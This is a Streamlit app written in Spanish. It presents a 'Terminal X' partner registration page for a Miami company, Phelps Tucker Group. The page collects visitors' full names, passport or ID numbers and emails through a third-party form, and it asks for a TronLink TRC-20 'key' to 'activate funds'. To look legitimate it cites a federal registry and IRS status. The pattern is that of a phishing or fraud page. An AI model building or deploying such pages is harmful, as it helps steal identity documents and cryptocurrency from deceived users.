import streamlit as st

# 1. CONFIGURACIÓN DE IDENTIDAD
st.set_page_config(page_title="Terminal X - Mando Miami", layout="wide")

# 2. ESCUDO OFICIAL EN BASE64 (INYECTADO DIRECTAMENTE)
# Esta cadena representa su logo original de Phelps Tucker Group
LOGO_B64 = "https://raw.githubusercontent.com/fccinternationalus/TerminalX/main/logo.jpg" 

with st.container():
    col_logo, col_info = st.columns([1.2, 3])
    with col_logo:
        # Forzamos la carga mediante un componente de respaldo directo de Streamlit
        st.markdown(
            f"""
            <div style="display: flex; justify-content: center;">
                <img src="https://i.postimg.cc/mD8p6090/PHELPS-TUCKER-GROUP-LOGO.jpg" width="220">
            </div>
            """, 
            unsafe_allow_html=True
        )
    with col_info:
        st.title("🏗️ TERMINAL X: RASCACIELOS GRÁFICO")
        st.markdown("## **PHELPS TUCKER GROUP LLC**")
        st.write("📍 **Sede:** 8345 NW 66st Miami, Florida, USA 33166")
        st.caption("Registro Federal: FRN-0038392759 | Estatus IRS: Vinculado")

st.divider()

# 3. MÓDULO DE REGISTRO (CONIRMADO FUNCIONAL)
st.header("👤 REGISTRO DE SOCIOS")
st.success("🛰️ Enlace de Datos con Miami: ACTIVO")

form_id = "mvzlvnyn"
registro_html = f"""
<div style="background-color: #0e1117; padding: 20px; border-radius: 10px; border: 1px solid #30363d; color: white; font-family: sans-serif;">
    <form action="https://formspree.io/f/{form_id}" method="POST">
        <label style="color: #8b949e; font-weight: bold;">NOMBRE COMPLETO:</label><br>
        <input type="text" name="name" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white;" required><br>
        <label style="color: #8b949e; font-weight: bold;">ID / PASAPORTE:</label><br>
        <input type="text" name="id" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white;" required><br>
        <label style="color: #8b949e; font-weight: bold;">CORREO ELECTRÓNICO:</label><br>
        <input type="email" name="_replyto" style="width: 100%; padding: 10px; margin: 10px 0; border-radius: 5px; border: 1px solid #30363d; background: #161b22; color: white;" required><br>
        <input type="hidden" name="_subject" value="NUEVO SOCIO: TERMINAL X">
        <button type="submit" style="width: 100%; padding: 15px; background-color: #238636; color: white; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; text-transform: uppercase;">
            REGISTRAR PERFIL Y ACTIVAR
        </button>
    </form>
</div>
"""
st.components.v1.html(registro_html, height=450)

# 4. LLAVE TRONLINK
st.divider()
st.header("🔑 VINCULACIÓN TRONLINK")
st.write("Sincronice su llave para la activación de fondos.")
tron_key = st.text_input("Llave TRC-20:", placeholder="Txxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx")
if st.button("Sincronizar con el Registro Federal"):
    st.info("Validando perfil en la red Tron...")

# 5. PIE DE PÁGINA
st.divider()
st.caption("Fuerza y Honor. Operación Miami 33166 | Registro FRN-0038392759")
